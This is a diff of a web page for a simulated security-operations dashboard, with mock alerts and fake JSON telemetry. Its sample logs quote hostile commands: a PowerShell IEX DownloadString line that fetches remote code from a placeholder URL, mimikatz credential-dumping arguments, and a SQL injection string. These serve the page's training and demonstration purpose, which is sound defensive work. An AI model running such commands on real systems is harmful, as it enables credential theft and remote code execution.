@@ -1,117 +1,216 @@
 ---
 layout: default
-title: SOC Dashboard
+title: Live Operations
 permalink: /alerts/
 ---
 
-<div class="soar-layout">
-    
-    <div class="main-panel">
-        
-        <div class="stats-grid">
-            <div class="stat-card danger-glow">
-                <h3>CRITICAL</h3>
-                <div class="number">2</div>
-            </div>
-            <div class="stat-card warning-glow">
-                <h3>HIGH</h3>
-                <div class="number">5</div>
-            </div>
-            <div class="stat-card info-glow">
-                <h3>OPEN CASES</h3>
-                <div class="number">7</div>
-            </div>
-            <div class="stat-card success-glow">
-                <h3>MTTR</h3>
-                <div class="number">8m</div>
-            </div>
-        </div>
+<style>
+    /* Sitenin genel dar yapısını bu sayfa için eziyoruz */
+    main {
+        max-width: 98% !important;
+        margin: 0 auto !important;
+        padding: 1rem !important;
+    }
+    header {
+        max-width: 100% !important;
+    }
+    .navbar {
+        max-width: 98% !important;
+    }
+</style>
 
-        <div class="alerts-table-wrapper">
-            <div class="table-header">
-                <div class="header-left">
-                    <span class="blink">●</span> LIVE FEED // SENTINEL_GUARD_SIEM
-                </div>
-                <div class="header-right">
-                    Queue: <span style="color: #fff">Tier 1 Analysis</span>
-                </div>
+<div class="soar-container">
+
+    <div class="dashboard-header">
+        <div class="header-left">
+            <h1><span class="blink">●</span> SECURITY OPERATIONS CENTER // LIVE FEED</h1>
+            <div class="subtitle">SENTINEL_GUARD_SIEM v4.2 | TIER-1 ANALYST VIEW</div>
+        </div>
+        <div class="header-right">
+            <div class="sim-badge">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                SIMULATION MODE ACTIVE
             </div>
-            <table class="soar-table">
-                <thead>
-                    <tr>
-                        <th>ID</th>
-                        <th>TIMESTAMP</th>
-                        <th>RULE NAME</th>
-                        <th>ASSET</th>
-                        <th>SEVERITY</th>
-                        <th>ACTION</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr>
-                        <td class="mono">#SOC-101</td>
-                        <td class="mono">10:42:15 UTC</td>
-                        <td>Credential Dumping (Mimikatz)</td>
-                        <td class="mono">FINANCE-SRV-01</td>
-                        <td><span class="badge critical">CRITICAL</span></td>
-                        <td><button class="btn-investigate" onclick="openModal('101')">VIEW LOGS</button></td>
-                    </tr>
-                    <tr>
-                        <td class="mono">#SOC-102</td>
-                        <td class="mono">10:38:00 UTC</td>
-                        <td>Brute Force Detection (RDP)</td>
-                        <td class="mono">HR-WORKSTATION-04</td>
-                        <td><span class="badge high">HIGH</span></td>
-                        <td><button class="btn-investigate" onclick="openModal('102')">VIEW LOGS</button></td>
-                    </tr>
-                    <tr>
-                        <td class="mono">#SOC-103</td>
-                        <td class="mono">09:15:22 UTC</td>
-                        <td>Suspicious PowerShell Execution</td>
-                        <td class="mono">DEV-LAPTOP-02</td>
-                        <td><span class="badge medium">MEDIUM</span></td>
-                        <td><button class="btn-investigate" onclick="openModal('103')">VIEW LOGS</button></td>
-                    </tr>
-                     <tr>
-                        <td class="mono">#SOC-104</td>
-                        <td class="mono">08:50:11 UTC</td>
-                        <td>User Added to Domain Admins</td>
-                        <td class="mono">DC-01</td>
-                        <td><span class="badge critical">CRITICAL</span></td>
-                        <td><button class="btn-investigate" disabled style="opacity:0.5">RESOLVED</button></td>
-                    </tr>
-                     <tr>
-                        <td class="mono">#SOC-105</td>
-                        <td class="mono">08:30:05 UTC</td>
-                        <td>Internal Port Scan (Recon)</td>
-                        <td class="mono">GUEST-WIFI-CLIENT</td>
-                        <td><span class="badge low">LOW</span></td>
-                        <td><button class="btn-investigate" disabled style="opacity:0.5">FALSE POS</button></td>
-                    </tr>
-                </tbody>
-            </table>
         </div>
     </div>
 
-    <div class="side-panel">
-        <div class="info-box">
-            <div class="info-header">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
-                SIMULATION MODE
-            </div>
-            <p>
-                This interface simulates a real-world **SOAR (Security Orchestration, Automation, and Response)** dashboard used by Tier-1 SOC Analysts.
-            </p>
-            <hr>
-            <p>
-                <strong>How to use:</strong> Click on the <span style="color:var(--accent)">VIEW LOGS</span> button to inspect the raw telemetry and event details generated by our mock SIEM engine.
-            </p>
-            <div class="system-meta">
-                <span>ENGINE:</span> SENTINEL_GUARD v4.2<br>
-                <span>LATENCY:</span> 24ms<br>
-                <span>ROLE:</span> ANALYST_VIEW
-            </div>
+    <div class="stats-row">
+        <div class="mini-card critical-border">
+            <span class="label">CRITICAL</span>
+            <span class="value critical-text">3</span>
         </div>
+        <div class="mini-card high-border">
+            <span class="label">HIGH</span>
+            <span class="value high-text">8</span>
+        </div>
+        <div class="mini-card medium-border">
+            <span class="label">MEDIUM</span>
+            <span class="value medium-text">14</span>
+        </div>
+        <div class="mini-card info-border">
+            <span class="label">OPEN CASES</span>
+            <span class="value">25</span>
+        </div>
+        <div class="mini-card success-border">
+            <span class="label">EPS (Events/Sec)</span>
+            <span class="value">4,250</span>
+        </div>
+        <div class="mini-card info-border">
+            <span class="label">LAST UPDATE</span>
+            <span class="value" id="timer">00:00:01</span>
+        </div>
+    </div>
+
+    <div class="table-container">
+        <table class="soar-table">
+            <thead>
+                <tr>
+                    <th style="width: 80px;">ID</th>
+                    <th style="width: 140px;">TIMESTAMP</th>
+                    <th>RULE / THREAT NAME</th>
+                    <th>SOURCE ASSET</th>
+                    <th>DESTINATION</th>
+                    <th>TECHNIQUE (MITRE)</th>
+                    <th style="width: 100px;">SEVERITY</th>
+                    <th style="width: 120px;">ACTION</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr class="row-critical">
+                    <td class="mono">#5092</td>
+                    <td class="mono">10:42:15</td>
+                    <td><strong>Ransomware Activity (WannaCry Pattern)</strong></td>
+                    <td class="mono">FINANCE-SRV-01</td>
+                    <td class="mono">10.20.5.100 (SMB)</td>
+                    <td><span class="mitre">T1486</span> Data Encrypted</td>
+                    <td><span class="badge critical">CRITICAL</span></td>
+                    <td><button class="btn-view" onclick="openModal('5092')">ANALYZE</button></td>
+                </tr>
+                <tr class="row-critical">
+                    <td class="mono">#5091</td>
+                    <td class="mono">10:41:05</td>
+                    <td><strong>Cobalt Strike Beacon Detected</strong></td>
+                    <td class="mono">HR-MANAGER-PC</td>
+                    <td class="mono">45.133.1.22 (C2)</td>
+                    <td><span class="mitre">T1071</span> C2 Traffic</td>
+                    <td><span class="badge critical">CRITICAL</span></td>
+                    <td><button class="btn-view" onclick="openModal('5091')">ANALYZE</button></td>
+                </tr>
+                <tr class="row-critical">
+                    <td class="mono">#5090</td>
+                    <td class="mono">10:38:22</td>
+                    <td><strong>Mimikatz Credential Dumping</strong></td>
+                    <td class="mono">CEO-LAPTOP</td>
+                    <td class="mono">Local Process (LSASS)</td>
+                    <td><span class="mitre">T1003</span> OS Cred Dumping</td>
+                    <td><span class="badge critical">CRITICAL</span></td>
+                    <td><button class="btn-view" onclick="openModal('5090')">ANALYZE</button></td>
+                </tr>
+
+                <tr>
+                    <td class="mono">#5089</td>
+                    <td class="mono">10:35:10</td>
+                    <td>Suspicious PowerShell DownloadString</td>
+                    <td class="mono">DEV-WORKSTATION-04</td>
+                    <td class="mono">External (Pastebin)</td>
+                    <td><span class="mitre">T1059</span> Command & Scripting</td>
+                    <td><span class="badge high">HIGH</span></td>
+                    <td><button class="btn-view" onclick="openModal('5089')">ANALYZE</button></td>
+                </tr>
+                <tr>
+                    <td class="mono">#5088</td>
+                    <td class="mono">10:30:00</td>
+                    <td>Impossible Travel Activity (Login)</td>
+                    <td class="mono">VPN-GATEWAY</td>
+                    <td class="mono">User: jdoe (CN -> US)</td>
+                    <td><span class="mitre">T1078</span> Valid Accounts</td>
+                    <td><span class="badge high">HIGH</span></td>
+                    <td><button class="btn-view" onclick="openModal('5088')">ANALYZE</button></td>
+                </tr>
+                <tr>
+                    <td class="mono">#5087</td>
+                    <td class="mono">10:28:45</td>
+                    <td>SQL Injection Attack (Successful)</td>
+                    <td class="mono">WEB-SRV-PROD</td>
+                    <td class="mono">DB-Internal</td>
+                    <td><span class="mitre">T1190</span> Exploit Public App</td>
+                    <td><span class="badge high">HIGH</span></td>
+                    <td><button class="btn-view" onclick="openModal('5087')">ANALYZE</button></td>
+                </tr>
+                 <tr>
+                    <td class="mono">#5086</td>
+                    <td class="mono">10:25:12</td>
+                    <td>Data Exfiltration (Large Upload > 5GB)</td>
+                    <td class="mono">FILE-SRV-02</td>
+                    <td class="mono">Mega.nz (Cloud)</td>
+                    <td><span class="mitre">T1567</span> Exfiltration via Web</td>
+                    <td><span class="badge high">HIGH</span></td>
+                    <td><button class="btn-view" onclick="openModal('5086')">ANALYZE</button></td>
+                </tr>
+
+                <tr>
+                    <td class="mono">#5085</td>
+                    <td class="mono">10:20:05</td>
+                    <td>Local Account Created (Admin)</td>
+                    <td class="mono">MARKETING-PC-01</td>
+                    <td class="mono">Local SAM</td>
+                    <td><span class="mitre">T1136</span> Create Account</td>
+                    <td><span class="badge medium">MEDIUM</span></td>
+                    <td><button class="btn-view" onclick="openModal('5085')">VIEW</button></td>
+                </tr>
+                <tr>
+                    <td class="mono">#5084</td>
+                    <td class="mono">10:15:33</td>
+                    <td>Port Scan Detected (Internal)</td>
+                    <td class="mono">GUEST-WIFI-CLIENT</td>
+                    <td class="mono">Multiple Targets</td>
+                    <td><span class="mitre">T1046</span> Network Discovery</td>
+                    <td><span class="badge medium">MEDIUM</span></td>
+                    <td><button class="btn-view" onclick="openModal('5084')">VIEW</button></td>
+                </tr>
+                 <tr>
+                    <td class="mono">#5083</td>
+                    <td class="mono">10:12:00</td>
+                    <td>Shadow IT: Dropbox Installed</td>
+                    <td class="mono">INTERN-PC-09</td>
+                    <td class="mono">N/A</td>
+                    <td>Policy Violation</td>
+                    <td><span class="badge medium">MEDIUM</span></td>
+                    <td><button class="btn-view" onclick="openModal('5083')">VIEW</button></td>
+                </tr>
+                 <tr>
+                    <td class="mono">#5082</td>
+                    <td class="mono">09:55:10</td>
+                    <td>Failed SSH Login (Brute Force)</td>
+                    <td class="mono">LINUX-JUMP-HOST</td>
+                    <td class="mono">Source: 192.168.1.5</td>
+                    <td><span class="mitre">T1110</span> Brute Force</td>
+                    <td><span class="badge medium">MEDIUM</span></td>
+                    <td><button class="btn-view" onclick="openModal('5082')">VIEW</button></td>
+                </tr>
+
+                <tr>
+                    <td class="mono">#5081</td>
+                    <td class="mono">09:40:22</td>
+                    <td>User Password Expired</td>
+                    <td class="mono">AD-CONTROLLER</td>
+                    <td class="mono">User: msmith</td>
+                    <td>Authentication</td>
+                    <td><span class="badge low">LOW</span></td>
+                    <td><button class="btn-view" disabled>AUTO-CLOSED</button></td>
+                </tr>
+                 <tr>
+                    <td class="mono">#5080</td>
+                    <td class="mono">09:30:15</td>
+                    <td>P2P Torrent Traffic Detected</td>
+                    <td class="mono">GUEST-WIFI-12</td>
+                    <td class="mono">External UDP</td>
+                    <td>Policy Violation</td>
+                    <td><span class="badge low">LOW</span></td>
+                    <td><button class="btn-view" disabled>BLOCKED</button></td>
+                </tr>
+            </tbody>
+        </table>
     </div>
 
 </div>
@@ -119,241 +218,220 @@ permalink: /alerts/
 <div id="logModal" class="modal">
     <div class="modal-content">
         <div class="modal-header">
-            <h2 id="modalTitle">CASE DETAILS</h2>
+            <h2 id="modalTitle">CASE ANALYSIS</h2>
             <span class="close" onclick="closeModal()">&times;</span>
         </div>
         <div class="modal-body">
-            <div class="log-metadata">
-                <div><strong>Source:</strong> <span id="logSource"></span></div>
-                <div><strong>Destination:</strong> <span id="logDest"></span></div>
-                <div><strong>Event ID:</strong> <span id="logEventId"></span></div>
+            <div class="log-grid">
+                <div class="log-item"><span>SOURCE IP:</span> <strong id="logSource"></strong></div>
+                <div class="log-item"><span>DESTINATION:</span> <strong id="logDest"></strong></div>
+                <div class="log-item"><span>TECHNIQUE:</span> <strong id="logTech"></strong></div>
+                <div class="log-item"><span>TIMESTAMP:</span> <strong id="logTime"></strong></div>
             </div>
-            <div class="code-block-wrapper">
-                <div class="code-label">RAW LOG PREVIEW (JSON)</div>
+            <div class="code-wrapper">
+                <div class="code-label">RAW TELEMETRY PREVIEW (JSON)</div>
                 <pre id="logContent" class="raw-log"></pre>
             </div>
-            <div class="modal-actions">
-                <button class="btn-action primary" onclick="simAction('Escalate')">ESCALATE TO TIER 2</button>
-                <button class="btn-action secondary" onclick="simAction('Close')">CLOSE AS FALSE POSITIVE</button>
+            <div class="modal-footer">
+                <button class="btn-action primary" onclick="simAction('Containment')">INITIATE CONTAINMENT</button>
+                <button class="btn-action secondary" onclick="simAction('Escalate')">ESCALATE TO TIER 2</button>
+                <button class="btn-action muted" onclick="closeModal()">CLOSE</button>
             </div>
         </div>
     </div>
 </div>
 
 <script>
-    // --- MOCK DATA (Fake Logs) ---
-    const alertData = {
-        '101': {
-            title: "CASE #101: Credential Dumping",
-            source: "192.168.1.105 (FINANCE-SRV-01)",
-            dest: "Local System (LSASS.exe)",
-            eventId: "4688",
-            log: JSON.stringify({
-                "timestamp": "2025-12-19T10:42:15.000Z",
-                "event_code": 10,
-                "process_name": "C:\\Windows\\Temp\\mimikatz.exe",
-                "command_line": "\"mimikatz.exe\" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
-                "parent_process": "powershell.exe",
-                "user": "NT AUTHORITY\\SYSTEM",
-                "hash_sha256": "a24b...f92a (Malicious)",
-                "alert_score": 100
-            }, null, 4)
-        },
-        '102': {
-            title: "CASE #102: RDP Brute Force",
-            source: "45.12.88.99 (External)",
-            dest: "192.168.1.20 (HR-WORKSTATION)",
-            eventId: "4625",
-            log: JSON.stringify({
-                "timestamp": "2025-12-19T10:38:00.000Z",
-                "action": "failure",
-                "failure_reason": "Unknown user name or bad password",
-                "src_ip": "45.12.88.99",
-                "dst_port": 3389,
-                "logon_type": 10,
-                "attempt_count": 45,
-                "target_account": "Administrator"
-            }, null, 4)
-        },
-        '103': {
-            title: "CASE #103: Suspicious PowerShell",
-            source: "192.168.1.55 (DEV-LAPTOP)",
-            dest: "External (Pastebin)",
-            eventId: "4104",
-            log: JSON.stringify({
-                "timestamp": "2025-12-19T09:15:22.000Z",
-                "script_block": "IEX(New-Object Net.WebClient).DownloadString('http://bit.ly/malware')",
-                "host": "DEV-LAPTOP-02",
-                "execution_policy": "Bypass",
-                "user": "corp\\jdoe",
-                "threat_level": "Medium"
-            }, null, 4)
-        }
+    // --- FAKE DATA DATABASE ---
+    const logsDB = {
+        '5092': { title: "Ransomware: WannaCry", src: "192.168.1.10 (FINANCE)", dst: "10.20.5.100", tech: "T1486 Data Encrypted", time: "10:42:15",
+                  json: { "event_id": 4663, "file_path": "D:\\Finance\\Budget.xlsx.wnry", "process": "tasksche.exe", "action": "WriteData", "entropy": 7.8, "alert": "High Entropy Write Detected" } },
+        '5091': { title: "C2: Cobalt Strike", src: "192.168.1.55 (HR)", dst: "45.133.1.22", tech: "T1071 App Layer Protocol", time: "10:41:05",
+                  json: { "protocol": "HTTPS", "user_agent": "Mozilla/5.0 (Windows NT 10.0)", "bytes_out": 2450, "beacon_interval": "5s", "jitter": "10%", "indicator": "Known Malicious IP" } },
+        '5090': { title: "Cred Dumping: Mimikatz", src: "192.168.1.200 (CEO)", dst: "LSASS.exe", tech: "T1003 OS Credential Dumping", time: "10:38:22",
+                  json: { "image": "C:\\Temp\\mimi.exe", "command_line": "sekurlsa::logonpasswords", "parent_process": "powershell.exe", "privilege": "SeDebugPrivilege", "hash_sha256": "aad3b...99a" } },
+        '5089': { title: "Scripting: PowerShell", src: "192.168.1.40 (DEV)", dst: "pastebin.com/raw/...", tech: "T1059 Command & Scripting", time: "10:35:10",
+                  json: { "script_block": "IEX(New-Object Net.WebClient).DownloadString...", "execution_policy": "Bypass", "user": "corp\\dev_admin", "trigger": "Suspicious Web Request from PS" } },
+        '5088': { title: "Identity: Impossible Travel", src: "203.0.113.5 (China)", dst: "VPN-Gateway", tech: "T1078 Valid Accounts", time: "10:30:00",
+                  json: { "user": "jdoe", "prev_login_ip": "198.51.100.2 (USA)", "prev_login_time": "10:10:00", "velocity": "9000 km/h", "alert": "Geo-velocity violation" } },
+        '5087': { title: "Web: SQL Injection", src: "185.200.1.1 (Attacker)", dst: "WEB-SRV-PROD", tech: "T1190 Exploit Public App", time: "10:28:45",
+                  json: { "url": "/login.php?user=' OR 1=1--", "http_method": "POST", "response_code": 200, "sql_error": "Syntax error in query", "waf_action": "Alert Only" } },
+        '5086': { title: "Exfiltration: Mega.nz", src: "192.168.1.88 (FILE-SRV)", dst: "mega.nz (443)", tech: "T1567 Exfiltration", time: "10:25:12",
+                  json: { "bytes_sent": 5368709120, "process": "chrome.exe", "file_type": ".zip", "dlp_tag": "CONFIDENTIAL", "duration": "450s" } },
+        '5085': { title: "Persistence: Local Account", src: "MARKETING-PC", dst: "Local SAM", tech: "T1136 Create Account", time: "10:20:05",
+                  json: { "event_id": 4720, "new_user": "Support_Backdoor", "creator": "CORP\\jsoh", "group": "Administrators", "alert": "Admin account created outside maintenance window" } }
     };
 
-    // --- MODAL FUNCTIONS ---
     function openModal(id) {
-        const data = alertData[id];
-        if (!data) return;
-
+        let data = logsDB[id];
+        if (!data) {
+            // Fallback for alerts without specific data
+            data = { title: "Generic Alert", src: "Unknown", dst: "Unknown", tech: "N/A", time: "N/A", json: {"info": "Log details not available in demo."} };
+        }
         document.getElementById('modalTitle').innerText = data.title;
-        document.getElementById('logSource').innerText = data.source;
-        document.getElementById('logDest').innerText = data.dest;
-        document.getElementById('logEventId').innerText = data.eventId;
-        document.getElementById('logContent').innerText = data.log;
-
+        document.getElementById('logSource').innerText = data.src;
+        document.getElementById('logDest').innerText = data.dst;
+        document.getElementById('logTech').innerText = data.tech;
+        document.getElementById('logTime').innerText = data.time;
+        document.getElementById('logContent').innerText = JSON.stringify(data.json, null, 4);
+        
         document.getElementById('logModal').style.display = "flex";
     }
 
     function closeModal() {
         document.getElementById('logModal').style.display = "none";
     }
-    
-    function simAction(action) {
-        alert("Simulation Action: " + action + "\nLog recorded in audit trail.");
+
+    function simAction(act) {
+        alert("SIMULATION: " + act + " initiated.\nAudit log updated.");
         closeModal();
     }
-
-    // Close modal if clicked outside
-    window.onclick = function(event) {
-        let modal = document.getElementById('logModal');
-        if (event.target == modal) {
-            closeModal();
-        }
-    }
+    
+    // Basit bir saat sayacı
+    setInterval(() => {
+        const now = new Date();
+        document.getElementById('timer').innerText = now.toLocaleTimeString();
+    }, 1000);
 </script>
 
 <style>
-    /* ===== LAYOUT & DASHBOARD ===== */
-    .soar-layout {
+    /* ===== FULL SCREEN OVERRIDES ===== */
+    .soar-container {
         display: flex;
-        flex-wrap: wrap;
-        gap: 2rem;
-        align-items: flex-start;
-        margin-bottom: 3rem;
-    }
-    .main-panel { flex: 3; min-width: 300px; }
-    .side-panel { flex: 1.2; min-width: 250px; }
-
-    /* Info Sidebar */
-    .info-box {
-        background: rgba(22, 27, 34, 0.8);
-        border: 1px solid #30363d;
-        border-top: 3px solid var(--accent);
-        padding: 1.5rem;
-        border-radius: 6px;
-        font-size: 0.9rem;
-        color: var(--text-muted);
-        position: sticky; top: 100px;
-    }
-    .info-header {
-        display: flex; align-items: center; gap: 10px; color: #e6edf3;
-        font-weight: bold; font-family: 'JetBrains Mono', monospace;
-        margin-bottom: 1rem; padding-bottom: 0.5rem; border-bottom: 1px dashed #30363d;
-    }
-    .info-box hr { border: 0; border-top: 1px solid #30363d; margin: 1rem 0; }
-    .system-meta {
-        font-family: 'JetBrains Mono', monospace; font-size: 0.75rem;
-        color: #58a6ff; background: rgba(88, 166, 255, 0.1); padding: 10px; border-radius: 4px;
+        flex-direction: column;
+        gap: 15px;
+        font-family: 'Inter', sans-serif;
+        padding-bottom: 50px;
     }
 
-    /* Stats Grid */
-    .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 1rem; margin-bottom: 2rem; }
-    .stat-card { background: #161b22; border: 1px solid #30363d; padding: 1rem; border-radius: 6px; text-align: center; }
-    .stat-card h3 { margin: 0; font-size: 0.75rem; color: #8b949e; letter-spacing: 1px; }
-    .stat-card .number { font-size: 2rem; font-weight: bold; color: #e6edf3; font-family: 'JetBrains Mono', monospace; }
-    .danger-glow { border-bottom: 3px solid #ff5f56; }
-    .warning-glow { border-bottom: 3px solid #d29922; }
-    .info-glow { border-bottom: 3px solid #58a6ff; }
-    .success-glow { border-bottom: 3px solid #3fb950; }
-
-    /* Alerts Table */
-    .alerts-table-wrapper { background: #161b22; border: 1px solid #30363d; border-radius: 8px; overflow: hidden; }
-    .table-header {
-        background: #0d1117; padding: 12px 15px; font-family: 'JetBrains Mono', monospace;
-        font-size: 0.75rem; color: #3fb950; border-bottom: 1px solid #30363d;
-        display: flex; justify-content: space-between;
+    /* --- HEADER --- */
+    .dashboard-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        border-bottom: 1px solid #30363d;
+        padding-bottom: 10px;
+        margin-bottom: 5px;
     }
-    .blink { animation: blinker 1.5s linear infinite; color: #ff5f56; margin-right: 5px; }
+    .header-left h1 { margin: 0; font-size: 1.2rem; color: #e6edf3; letter-spacing: 1px; }
+    .subtitle { font-size: 0.8rem; color: #8b949e; margin-top: 5px; font-family: 'JetBrains Mono', monospace; }
+    .sim-badge {
+        background: rgba(56, 139, 253, 0.1); color: #58a6ff;
+        padding: 6px 12px; border-radius: 4px; font-size: 0.75rem;
+        font-weight: bold; border: 1px solid rgba(88, 166, 255, 0.3);
+        display: flex; align-items: center; gap: 8px;
+    }
+    .blink { color: #ff5f56; animation: blinker 1s infinite; }
     @keyframes blinker { 50% { opacity: 0; } }
 
-    .soar-table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
-    .soar-table th { background: #161b22; color: #8b949e; text-align: left; padding: 12px; border-bottom: 1px solid #30363d; font-size: 0.75rem; }
-    .soar-table td { padding: 12px; border-bottom: 1px solid #30363d; color: #c9d1d9; }
-    .soar-table tr:hover { background-color: rgba(255,255,255,0.03); }
-    .mono { font-family: 'JetBrains Mono', monospace; }
+    /* --- MINI STATS ROW --- */
+    .stats-row {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+        gap: 10px;
+    }
+    .mini-card {
+        background: #161b22;
+        border: 1px solid #30363d;
+        padding: 10px 15px;
+        border-radius: 4px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+    }
+    .critical-border { border-left: 3px solid #ff5f56; }
+    .high-border { border-left: 3px solid #d29922; }
+    .medium-border { border-left: 3px solid #58a6ff; }
+    .success-border { border-left: 3px solid #3fb950; }
+    .info-border { border-left: 3px solid #8b949e; }
 
-    /* Badges & Buttons */
-    .badge { padding: 3px 6px; border-radius: 4px; font-weight: bold; font-size: 0.65rem; }
+    .mini-card .label { font-size: 0.65rem; color: #8b949e; font-weight: bold; letter-spacing: 0.5px; margin-bottom: 4px; }
+    .mini-card .value { font-size: 1.4rem; font-weight: bold; color: #e6edf3; font-family: 'JetBrains Mono', monospace; line-height: 1; }
+    .critical-text { color: #ff5f56; }
+    .high-text { color: #d29922; }
+    .medium-text { color: #58a6ff; }
+
+    /* --- TABLE --- */
+    .table-container {
+        background: #161b22;
+        border: 1px solid #30363d;
+        border-radius: 6px;
+        overflow-x: auto;
+    }
+    .soar-table {
+        width: 100%;
+        border-collapse: collapse;
+        font-size: 0.85rem;
+    }
+    .soar-table th {
+        background: #0d1117;
+        color: #8b949e;
+        text-align: left;
+        padding: 10px 15px;
+        border-bottom: 1px solid #30363d;
+        font-size: 0.7rem;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+    }
+    .soar-table td {
+        padding: 8px 15px;
+        border-bottom: 1px solid #30363d;
+        color: #c9d1d9;
+        vertical-align: middle;
+    }
+    .soar-table tr:hover { background-color: rgba(255,255,255,0.03); cursor: default; }
+    
+    /* Yanıp sönen kırmızı satır efekti (Critical için) */
+    .row-critical { background: rgba(255, 95, 86, 0.05); }
+
+    .mono { font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; }
+    .mitre {
+        background: rgba(110, 118, 129, 0.2);
+        padding: 2px 6px; border-radius: 4px; font-size: 0.7rem;
+        color: #c9d1d9; border: 1px solid rgba(110, 118, 129, 0.4);
+        margin-right: 5px;
+    }
+
+    .badge { padding: 3px 8px; border-radius: 4px; font-weight: bold; font-size: 0.65rem; text-transform: uppercase; }
     .critical { background: rgba(255, 95, 86, 0.15); color: #ff5f56; border: 1px solid #ff5f56; }
     .high { background: rgba(210, 153, 34, 0.15); color: #d29922; border: 1px solid #d29922; }
     .medium { background: rgba(88, 166, 255, 0.15); color: #58a6ff; border: 1px solid #58a6ff; }
     .low { background: rgba(139, 148, 158, 0.15); color: #8b949e; border: 1px solid #8b949e; }
 
-    .btn-investigate {
+    .btn-view {
         background: transparent; border: 1px solid #30363d; color: var(--accent);
-        padding: 5px 12px; border-radius: 4px; cursor: pointer;
-        font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; font-weight: bold;
+        padding: 4px 10px; border-radius: 3px; cursor: pointer;
+        font-family: 'JetBrains Mono', monospace; font-size: 0.7rem;
         transition: all 0.2s;
     }
-    .btn-investigate:hover:not(:disabled) { background: var(--accent); color: #0d1117; }
+    .btn-view:hover { background: var(--accent); color: #0d1117; }
 
-    /* ===== MODAL (POPUP) STYLES ===== */
-    .modal {
-        display: none; /* Hidden by default */
-        position: fixed; z-index: 2000; left: 0; top: 0;
-        width: 100%; height: 100%;
-        background-color: rgba(0,0,0,0.8); /* Black w/ opacity */
-        backdrop-filter: blur(5px);
-        align-items: center; justify-content: center;
-    }
-
-    .modal-content {
-        background-color: #161b22; border: 1px solid #30363d;
-        width: 90%; max-width: 800px; border-radius: 8px;
-        box-shadow: 0 0 30px rgba(0,0,0,0.7);
-        animation: slideDown 0.3s ease-out;
-    }
-
-    .modal-header {
-        padding: 1rem 1.5rem; border-bottom: 1px solid #30363d;
-        display: flex; justify-content: space-between; align-items: center;
-        background: #0d1117; border-radius: 8px 8px 0 0;
-    }
-    .modal-header h2 { margin: 0; font-size: 1.2rem; color: var(--accent); border: none; }
-    .close { color: #8b949e; font-size: 28px; font-weight: bold; cursor: pointer; }
-    .close:hover { color: #fff; }
-
-    .modal-body { padding: 1.5rem; }
-
-    .log-metadata {
-        display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 1.5rem;
-        font-family: 'Inter', sans-serif; font-size: 0.9rem; color: #c9d1d9;
-    }
-
-    .code-block-wrapper { margin-bottom: 2rem; }
-    .code-label { font-size: 0.75rem; color: #8b949e; margin-bottom: 5px; font-family: 'JetBrains Mono', monospace; }
-    .raw-log {
-        background: #0d1117; padding: 15px; border-radius: 6px; border: 1px solid #30363d;
-        color: #3fb950; font-size: 0.85rem; overflow-x: auto;
-    }
-
-    .modal-actions { display: flex; gap: 1rem; justify-content: flex-end; }
-    .btn-action {
-        padding: 10px 20px; border-radius: 4px; font-weight: bold; cursor: pointer; border: none; font-family: 'JetBrains Mono', monospace;
-    }
+    /* --- MODAL --- */
+    .modal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(3px); align-items: center; justify-content: center; }
+    .modal-content { background: #0d1117; border: 1px solid #58a6ff; width: 80%; max-width: 900px; border-radius: 6px; box-shadow: 0 0 50px rgba(88, 166, 255, 0.2); animation: popIn 0.2s ease-out; }
+    .modal-header { background: #161b22; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #30363d; }
+    .modal-header h2 { margin: 0; font-size: 1.1rem; color: #58a6ff; font-family: 'JetBrains Mono', monospace; }
+    .close { color: #fff; font-size: 24px; cursor: pointer; }
+    .modal-body { padding: 20px; }
+    
+    .log-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; font-size: 0.9rem; }
+    .log-item span { color: #8b949e; display: block; font-size: 0.7rem; margin-bottom: 2px; }
+    .log-item strong { color: #e6edf3; font-family: 'JetBrains Mono', monospace; }
+    
+    .raw-log { background: #000; color: #3fb950; padding: 15px; border: 1px solid #30363d; border-radius: 4px; overflow: auto; max-height: 300px; font-size: 0.8rem; }
+    
+    .modal-footer { margin-top: 20px; display: flex; gap: 10px; justify-content: flex-end; }
+    .btn-action { padding: 8px 16px; border-radius: 4px; font-weight: bold; cursor: pointer; border: none; font-size: 0.8rem; }
     .primary { background: #ff5f56; color: #fff; }
-    .secondary { background: #30363d; color: #c9d1d9; border: 1px solid #8b949e; }
-    .primary:hover { background: #ff4436; }
-    .secondary:hover { border-color: #fff; }
+    .secondary { background: #d29922; color: #fff; }
+    .muted { background: transparent; border: 1px solid #30363d; color: #8b949e; }
 
-    @keyframes slideDown {
-        from { transform: translateY(-50px); opacity: 0; }
-        to { transform: translateY(0); opacity: 1; }
-    }
+    @keyframes popIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
 
+    /* Mobile Responsive */
     @media (max-width: 768px) {
-        .soar-layout { flex-direction: column-reverse; }
-        .log-metadata { grid-template-columns: 1fr; }
+        .stats-row { grid-template-columns: 1fr 1fr; }
+        .table-container { overflow-x: auto; }
+        .soar-table th, .soar-table td { font-size: 0.7rem; padding: 5px; }
     }
 </style>
